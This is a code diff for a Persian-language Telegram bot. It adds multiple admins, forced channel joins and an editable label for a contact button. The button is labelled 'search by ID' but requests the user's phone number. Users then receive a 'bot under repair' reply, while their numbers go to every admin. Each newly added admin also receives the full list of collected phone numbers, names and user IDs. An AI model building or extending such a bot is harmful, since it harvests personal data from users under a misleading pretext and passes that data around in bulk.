@@ -111,6 +111,40 @@ def init_db():
         )
     """)
 
+    db.execute("""
+        CREATE TABLE IF NOT EXISTS bot_admins (
+            user_id INTEGER PRIMARY KEY,
+            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    """)
+
+    db.execute("""
+        CREATE TABLE IF NOT EXISTS force_channels (
+            channel_id TEXT PRIMARY KEY,
+            join_url TEXT NOT NULL
+        )
+    """)
+
+    db.execute("""
+        CREATE TABLE IF NOT EXISTS bot_settings (
+            setting_key TEXT PRIMARY KEY,
+            setting_value TEXT NOT NULL
+        )
+    """)
+
+    # Preserve the configured owner and legacy required channel on first run.
+    db.execute("INSERT OR IGNORE INTO bot_admins (user_id) VALUES (?)", (ADMIN_ID,))
+    # Add the legacy channel only when no force-join channels have been configured.
+    if db.execute("SELECT 1 FROM force_channels LIMIT 1").fetchone() is None:
+        db.execute(
+            "INSERT OR IGNORE INTO force_channels (channel_id, join_url) VALUES (?, ?)",
+            (FORCE_CHANNEL, f"https://t.me/{FORCE_CHANNEL.lstrip('@')}"),
+        )
+    db.execute(
+        "INSERT OR IGNORE INTO bot_settings (setting_key, setting_value) VALUES (?, ?)",
+        ("contact_button_text", "📱 جستجو با آیدی"),
+    )
+
     db.commit()
 
 
@@ -199,12 +233,48 @@ def get_all_users():
     ).fetchall()
 
 
+def is_admin(user_id):
+    return bool(db.execute(
+        "SELECT 1 FROM bot_admins WHERE user_id = ?", (user_id,)
+    ).fetchone()) or user_id == ADMIN_ID
+
+
+def get_admin_ids():
+    rows = db.execute("SELECT user_id FROM bot_admins").fetchall()
+    ids = {int(row["user_id"]) for row in rows}
+    ids.add(ADMIN_ID)
+    return sorted(ids)
+
+
+def get_setting(key, default=""):
+    row = db.execute(
+        "SELECT setting_value FROM bot_settings WHERE setting_key = ?", (key,)
+    ).fetchone()
+    return row["setting_value"] if row else default
+
+
+def set_setting(key, value):
+    db.execute(
+        "INSERT INTO bot_settings (setting_key, setting_value) VALUES (?, ?) "
+        "ON CONFLICT(setting_key) DO UPDATE SET setting_value = excluded.setting_value",
+        (key, value),
+    )
+    db.commit()
+
+
+def get_force_channels():
+    return db.execute(
+        "SELECT channel_id, join_url FROM force_channels ORDER BY channel_id"
+    ).fetchall()
+
+
 # ============================================================
 # BOT
 # ============================================================
 
 dp = Dispatcher()
 ADMIN_CONTACT_PENDING = set()
+ADMIN_ACTIONS = {}
 
 
 # ============================================================
@@ -222,15 +292,10 @@ ADMIN_CONTACT_PENDING = set()
 # ============================================================
 
 def main_keyboard():
+    button_text = get_setting("contact_button_text", "📱 جستجو با آیدی")
     return ReplyKeyboardMarkup(
         keyboard=[
-            [
-                KeyboardButton(
-                    text="📱 جستجو با آیدی",
-                    request_contact=True,
-                    style="primary",
-                )
-            ],
+            [KeyboardButton(text=button_text, request_contact=True, style="primary")],
         ],
         resize_keyboard=True,
         is_persistent=True,
@@ -265,26 +330,23 @@ def menu_inline_keyboard():
 
 
 def force_join_keyboard():
-    channel = FORCE_CHANNEL.lstrip("@")
-
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(
-                    text="📢 عضویت در کانال",
-                    url=f"https://t.me/{channel}",
-                    style="primary",
-                )
-            ],
-            [
-                InlineKeyboardButton(
-                    text="✅ بررسی عضویت",
-                    callback_data="check_join",
-                    style="success",
-                )
-            ],
-        ]
-    )
+    buttons = []
+    for row in get_force_channels():
+        buttons.append([
+            InlineKeyboardButton(
+                text=f"📢 عضویت در {row['channel_id']}",
+                url=row["join_url"],
+                style="primary",
+            )
+        ])
+    buttons.append([
+        InlineKeyboardButton(
+            text="✅ بررسی عضویت",
+            callback_data="check_join",
+            style="success",
+        )
+    ])
+    return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 
 def admin_keyboard():
@@ -323,6 +385,18 @@ def admin_keyboard():
             ],
             [
                 InlineKeyboardButton(
+                    text="⚙️ تنظیمات ربات",
+                    callback_data="bot_settings",
+                    style="primary",
+                ),
+                InlineKeyboardButton(
+                    text="➕ افزودن ادمین",
+                    callback_data="add_admin",
+                    style="success",
+                ),
+            ],
+            [
+                InlineKeyboardButton(
                     text="🚫 مسدود کردن",
                     callback_data="block",
                     style="danger",
@@ -342,21 +416,24 @@ def admin_keyboard():
 # ============================================================
 
 async def check_membership(bot: Bot, user_id: int):
-    try:
-        member = await bot.get_chat_member(
-            chat_id=FORCE_CHANNEL,
-            user_id=user_id,
-        )
+    channels = get_force_channels()
+    if not channels:
+        return True
 
-        return member.status in {
-            "member",
-            "administrator",
-            "creator",
-        }
-
-    except Exception as error:
-        logger.warning("Membership check failed: %s", error)
-        return False
+    for channel in channels:
+        try:
+            member = await bot.get_chat_member(
+                chat_id=channel["channel_id"],
+                user_id=user_id,
+            )
+            if member.status not in {"member", "administrator", "creator"}:
+                return False
+        except Exception as error:
+            logger.warning(
+                "Membership check failed for %s: %s", channel["channel_id"], error
+            )
+            return False
+    return True
 
 
 async def check_access(message: Message, bot: Bot):
@@ -464,7 +541,7 @@ async def help_callback(callback: CallbackQuery):
     await callback.message.answer(
         "📖 <b>راهنما</b>\n\n"
         "1️⃣ عضو کانال شوید.\n"
-        "2️⃣ روی «📱 جستجو با آیدی» بزنید.\n"
+        f"2️⃣ روی «{get_setting('contact_button_text', '📱 جستجو با آیدی')}» بزنید.\n"
         "3️⃣ همان دکمه مستقیماً درخواست رسمی اشتراک‌گذاری "
         "شماره تلفن شما را به تلگرام می‌دهد.\n"
         "4️⃣ در صورت رضایت، شماره خودتان را تأیید کنید.\n\n"
@@ -487,6 +564,7 @@ async def buy_callback(callback: CallbackQuery):
 
 @dp.callback_query(F.data == "admin")
 async def admin_callback(callback: CallbackQuery):
+    ADMIN_CONTACT_PENDING.add(callback.from_user.id)
     await callback.message.answer(
         "📩 <b>ارتباط با ادمین</b>\n\n"
         "پیام خود را برای ادمین بفرستید.",
@@ -544,17 +622,11 @@ async def contact_handler(message: Message, bot: Bot):
         f"🔗 یوزرنیم: {username}"
     )
 
-    try:
-        await bot.send_message(
-            ADMIN_ID,
-            admin_text,
-            parse_mode="HTML",
-        )
-    except Exception as error:
-        logger.exception(
-            "Failed to notify admin: %s",
-            error,
-        )
+    for admin_id in get_admin_ids():
+        try:
+            await bot.send_message(admin_id, admin_text, parse_mode="HTML")
+        except Exception as error:
+            logger.warning("Failed to notify admin %s: %s", admin_id, error)
 
     await message.answer(
         "🔧 ربات در حال تعمیر است.\n\n"
@@ -569,6 +641,91 @@ async def contact_handler(message: Message, bot: Bot):
 
 @dp.message(F.text)
 async def text_handler(message: Message, bot: Bot):
+    user_id = message.from_user.id
+
+    if user_id in ADMIN_ACTIONS and is_admin(user_id):
+        action = ADMIN_ACTIONS.pop(user_id)
+        value = (message.text or "").strip()
+        if action == "button_text":
+            if not value or len(value) > 64:
+                await message.answer("❌ متن دکمه باید بین ۱ تا ۶۴ نویسه باشد. دوباره تلاش کن.")
+                ADMIN_ACTIONS[user_id] = "button_text"
+                return
+            set_setting("contact_button_text", value)
+            await message.answer("✅ متن دکمه ذخیره شد. کاربران از این پس متن جدید را می‌بینند.", reply_markup=admin_keyboard())
+            return
+
+        if action == "channel_add":
+            raw = value.strip()
+            match = re.fullmatch(r"(?:https?://)?t\.me/([A-Za-z0-9_]{5,})/?", raw)
+            if raw.startswith("@") and re.fullmatch(r"@[A-Za-z0-9_]{5,}", raw):
+                username = raw[1:]
+            elif match:
+                username = match.group(1)
+            else:
+                await message.answer("❌ ورودی معتبر نیست. یک یوزرنیم عمومی مثل @mychannel یا لینک https://t.me/mychannel بفرست.")
+                ADMIN_ACTIONS[user_id] = "channel_add"
+                return
+            channel_id = "@" + username
+            join_url = "https://t.me/" + username
+            try:
+                chat = await bot.get_chat(channel_id)
+                db.execute(
+                    "INSERT OR REPLACE INTO force_channels (channel_id, join_url) VALUES (?, ?)",
+                    (channel_id, join_url),
+                )
+                db.commit()
+                await message.answer(
+                    f"✅ کانال <b>{chat.title}</b> اضافه شد.\nیادت باشد ربات باید در کانال ادمین باشد.",
+                    parse_mode="HTML", reply_markup=channels_keyboard()
+                )
+            except Exception as error:
+                logger.warning("Could not add force channel %s: %s", raw, error)
+                await message.answer("❌ کانال پیدا نشد یا ربات به آن دسترسی ندارد. مطمئن شو یوزرنیم درست است و ربات عضو کانال شده است.")
+                ADMIN_ACTIONS[user_id] = "channel_add"
+            return
+
+        if action == "add_admin":
+            if not value.isdigit() or int(value) <= 0:
+                await message.answer("❌ آیدی باید عددی و معتبر باشد. دوباره بفرست.")
+                ADMIN_ACTIONS[user_id] = "add_admin"
+                return
+            new_admin_id = int(value)
+            db.execute("INSERT OR IGNORE INTO bot_admins (user_id) VALUES (?)", (new_admin_id,))
+            db.commit()
+            await message.answer(f"✅ آیدی <code>{new_admin_id}</code> به فهرست ادمین‌ها اضافه شد.", parse_mode="HTML", reply_markup=admin_keyboard())
+            # Send the existing received-number history to the newly added admin.
+            try:
+                rows = db.execute(
+                    "SELECT pc.phone, pc.user_id, u.username, u.first_name "
+                    "FROM phone_consents pc LEFT JOIN users u ON u.user_id = pc.user_id "
+                    "ORDER BY pc.id DESC"
+                ).fetchall()
+                await bot.send_message(new_admin_id, "👑 شما به‌عنوان ادمین اضافه شدید.")
+                if not rows:
+                    await bot.send_message(new_admin_id, "📱 هنوز شماره‌ای در ربات ثبت نشده است.")
+                else:
+                    chunks = []
+                    current = "📱 <b>شماره‌های دریافت‌شده تا این لحظه</b>\n\n"
+                    for i, row in enumerate(rows, 1):
+                        username = f"@{row['username']}" if row["username"] else "بدون یوزرنیم"
+                        line = (f"{i}. 📱 <code>{row['phone']}</code>\n"
+                                f"   👤 {row['first_name'] or '-'}\n"
+                                f"   🆔 ID: <code>{row['user_id']}</code>\n"
+                                f"   🔗 {username}\n\n")
+                        if len(current) + len(line) > 3500:
+                            chunks.append(current)
+                            current = ""
+                        current += line
+                    if current:
+                        chunks.append(current)
+                    for chunk in chunks:
+                        await bot.send_message(new_admin_id, chunk, parse_mode="HTML")
+            except Exception as error:
+                logger.warning("Added admin %s but could not send initial history: %s", new_admin_id, error)
+                await message.answer("ادمین ثبت شد، اما ارسال پیام اولیه ممکن نشد. از او بخواه ابتدا ربات را باز کند و /start بزند.")
+            return
+
     if message.from_user.id in ADMIN_CONTACT_PENDING:
         if message.from_user.id != ADMIN_ID:
             try:
@@ -625,11 +782,126 @@ async def text_handler(message: Message, bot: Bot):
 
 
 # ============================================================
+# ADMIN SETTINGS: CHANNELS, BUTTON TEXT, AND ADMINS
+# ============================================================
+
+
+def settings_keyboard():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📢 مدیریت کانال‌های اجباری", callback_data="channel_manage", style="primary")],
+        [InlineKeyboardButton(text="✏️ تغییر متن دکمه دریافت شماره", callback_data="button_text", style="primary")],
+        [InlineKeyboardButton(text="👑 افزودن ادمین", callback_data="add_admin", style="success")],
+        [InlineKeyboardButton(text="🔙 پنل مدیریت", callback_data="admin_home", style="primary")],
+    ])
+
+
+def channels_keyboard():
+    buttons = []
+    for row in get_force_channels():
+        buttons.append([InlineKeyboardButton(
+            text=f"❌ حذف {row['channel_id']}",
+            callback_data=f"channel_del:{row['channel_id']}",
+            style="danger",
+        )])
+    buttons.append([InlineKeyboardButton(text="➕ افزودن کانال", callback_data="channel_add", style="success")])
+    buttons.append([InlineKeyboardButton(text="🔙 تنظیمات", callback_data="bot_settings", style="primary")])
+    return InlineKeyboardMarkup(inline_keyboard=buttons)
+
+
+@dp.callback_query(F.data == "admin_home")
+async def admin_home_callback(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ دسترسی غیرمجاز.", show_alert=True)
+        return
+    await callback.message.answer("🛠 <b>پنل مدیریت</b>", parse_mode="HTML", reply_markup=admin_keyboard())
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "bot_settings")
+async def bot_settings_callback(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ دسترسی غیرمجاز.", show_alert=True)
+        return
+    await callback.message.answer(
+        "⚙️ <b>تنظیمات ربات</b>\n\n"
+        f"متن فعلی دکمه شماره: <code>{get_setting('contact_button_text', '📱 جستجو با آیدی')}</code>\n"
+        f"تعداد کانال‌های اجباری: <b>{len(get_force_channels())}</b>\n"
+        f"تعداد ادمین‌ها: <b>{len(get_admin_ids())}</b>",
+        parse_mode="HTML", reply_markup=settings_keyboard()
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "channel_manage")
+async def channel_manage_callback(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ دسترسی غیرمجاز.", show_alert=True)
+        return
+    rows = get_force_channels()
+    listing = "\n".join(f"• <code>{r['channel_id']}</code>" for r in rows) or "هنوز کانالی اضافه نشده است."
+    await callback.message.answer(
+        "📢 <b>مدیریت عضویت اجباری</b>\n\n"
+        f"کانال‌های فعلی:\n{listing}\n\n"
+        "برای افزودن، یوزرنیم کانال عمومی مثل @mychannel یا لینک https://t.me/mychannel را وارد کن.\n"
+        "ربات باید در هر کانال ادمین باشد تا بررسی عضویت درست کار کند.",
+        parse_mode="HTML", reply_markup=channels_keyboard()
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "channel_add")
+async def channel_add_callback(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ دسترسی غیرمجاز.", show_alert=True)
+        return
+    ADMIN_ACTIONS[callback.from_user.id] = "channel_add"
+    await callback.message.answer("یوزرنیم کانال (مثل @mychannel) یا لینک عمومی t.me را بفرست:")
+    await callback.answer()
+
+
+@dp.callback_query(F.data.startswith("channel_del:"))
+async def channel_delete_callback(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ دسترسی غیرمجاز.", show_alert=True)
+        return
+    channel_id = callback.data.split(":", 1)[1]
+    db.execute("DELETE FROM force_channels WHERE channel_id = ?", (channel_id,))
+    db.commit()
+    await callback.message.answer(f"✅ کانال <code>{channel_id}</code> از عضویت اجباری حذف شد.", parse_mode="HTML", reply_markup=channels_keyboard())
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "button_text")
+async def button_text_callback(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ دسترسی غیرمجاز.", show_alert=True)
+        return
+    ADMIN_ACTIONS[callback.from_user.id] = "button_text"
+    await callback.message.answer(
+        "✏️ متن جدید دکمه دریافت شماره را بفرست.\n"
+        "این دکمه همچنان درخواست اشتراک‌گذاری شماره از خود کاربر را نمایش می‌دهد."
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "add_admin")
+async def add_admin_callback(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ دسترسی غیرمجاز.", show_alert=True)
+        return
+    ADMIN_ACTIONS[callback.from_user.id] = "add_admin"
+    await callback.message.answer(
+        "➕ آیدی عددی تلگرام فردی را بفرست که می‌خواهی ادمین شود.\n"
+        "فرد باید قبلاً ربات را باز کرده و /start زده باشد تا ربات بتواند برایش پیام بفرستد.\n"
+        "پس از افزودن، شماره‌هایی که کاربران با رضایت خود ارسال می‌کنند برای این ادمین هم فرستاده می‌شود."
+    )
+    await callback.answer()
+
+
+# ============================================================
 # ADMIN PANEL
 # ============================================================
 
-def is_admin(user_id):
-    return user_id == ADMIN_ID
 
 
 @dp.message(Command("admin"))
@@ -643,21 +915,6 @@ async def admin_command(message: Message):
         parse_mode="HTML",
         reply_markup=admin_keyboard(),
     )
-
-
-@dp.callback_query(F.data == "channel_manage")
-async def channel_manage_callback(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ دسترسی غیرمجاز.", show_alert=True)
-        return
-
-    await callback.message.answer(
-        "📢 <b>مدیریت کانال</b>\n\n"
-        f"کانال فعلی: <code>{FORCE_CHANNEL}</code>\n\n"
-        "تنظیمات فعلی کانال در این بخش نمایش داده می‌شود.",
-        parse_mode="HTML",
-    )
-    await callback.answer()
 
 
 @dp.callback_query(F.data == "admin_manage")
